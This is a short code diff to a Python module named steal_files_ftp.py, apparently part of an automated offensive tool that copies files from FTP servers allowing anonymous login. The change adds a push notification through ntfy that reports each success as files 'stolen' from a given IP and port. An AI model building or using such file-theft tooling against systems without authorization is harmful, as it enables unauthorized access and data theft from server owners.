@@ -10,6 +10,7 @@ from threading import Timer
 from ftplib import FTP
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
 
 # Configure the logger
 logger = Logger(name="steal_files_ftp.py", level=logging.DEBUG)
@@ -149,6 +150,8 @@ class StealFilesFTP:
                         success = True
                         countfiles = len(remote_files)
                         logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
+                        message = f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access (FTP)"
+                        send_ntfy(message=message)
                     ftp.quit()
                     if success:
                         timer.cancel()  # Cancel the timer if the operation is successful
